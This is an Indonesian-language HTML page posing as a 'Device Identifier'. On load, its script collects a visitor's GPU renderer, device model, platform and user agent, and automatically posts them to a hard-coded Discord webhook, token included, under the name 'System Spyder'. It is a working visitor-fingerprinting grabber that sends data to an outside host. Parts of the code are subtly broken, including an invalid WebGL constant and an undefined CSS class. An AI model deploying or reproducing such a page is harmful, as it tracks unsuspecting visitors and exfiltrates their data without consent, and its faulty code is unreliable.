<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Informasi Perangkat</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 100%; max-width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #38bdf8; text-align: center; margin-bottom: 20px; }
        .info-box { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; }
        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 4px; }
        .value { color: #f1f5f9; font-size: 14px; word-break: break-all; line-height: 1.5; display: block; }
        .status-tag { text-align: center; padding: 8px; border-radius: 5px; font-size: 12px; margin-top: 10px; font-weight: bold; }
        .success { background: #065f46; color: #34d399; }
        .pending { background: #854d0e; color: #fde047; }
    </style>
</head>
<body>

<div class="card">
    <h2>Device Identifier</h2>
    
    <div class="info-box">
        <span class="label">Merk & Nama Produk</span>
        <span id="brand-out" class="value">Mendeteksi...</span>
    </div>

    <div class="info-box">
        <span class="label">Model Hardware</span>
        <span id="model-out" class="value">Mencari...</span>
    </div>

    <div class="info-box">
        <span class="label">Chipset (GPU)</span>
        <span id="gpu-out" class="value">Menganalisis...</span>
    </div>

    <div class="info-box">
        <span class="label">User Agent</span>
        <span id="ua-out" class="value">Memuat...</span>
    </div>

    <div id="status" class="status-tag pending">Menghubungkan ke Webhook...</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

    async function getDeviceInfo() {
        let data = {
            brand: "Android/Generic",
            model: "Unknown",
            productName: "Smartphone",
            gpu: "N/A",
            ua: navigator.userAgent
        };

        // 1. Get GPU (Chipset Info)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
        }

        // 2. Get Model & Brand (Modern Way)
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
            data.model = hints.model || "K";
            data.brand = hints.platform || "Android";
        }

        // 3. Nama Produk (Sederhana - Bisa ditambah listnya)
        if (data.model.includes("SM-G991")) data.productName = "Samsung Galaxy S21";
        else if (data.model.includes("SM-A546")) data.productName = "Samsung Galaxy A54";
        else if (data.model.includes("CPH")) data.productName = "OPPO Perangkat";
        else if (data.model !== "Unknown") data.productName = "Android " + data.model;

        // Update UI
        document.getElementById('brand-out').innerText = data.productName;
        document.getElementById('model-out').innerText = data.model;
        document.getElementById('gpu-out').innerText = data.gpu;
        document.getElementById('ua-out').innerText = data.ua;

        sendToDiscord(data);
    }

    function sendToDiscord(d) {
        const payload = {
            username: "System Spyder",
            embeds: [{
                title: "📱 Perangkat Terdeteksi",
                color: 5814783,
                fields: [
                    { name: "Nama Produk", value: d.productName, inline: true },
                    { name: "Model", value: d.model, inline: true },
                    { name: "GPU", value: d.gpu, inline: false },
                    { name: "User Agent", value: "```" + d.ua + "```" }
                ],
                timestamp: new Date()
            }]
        };

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(() => {
            document.getElementById('status').innerText = "✓ Data Terkirim";
            document.getElementById('status').className = "status-tag success";
        })
        .catch(() => {
            document.getElementById('status').innerText = "✗ Webhook Gagal";
            document.getElementById('status').className = "status-tag error";
        });
    }

    window.onload = getDeviceInfo;
</script>

</body>
</html>
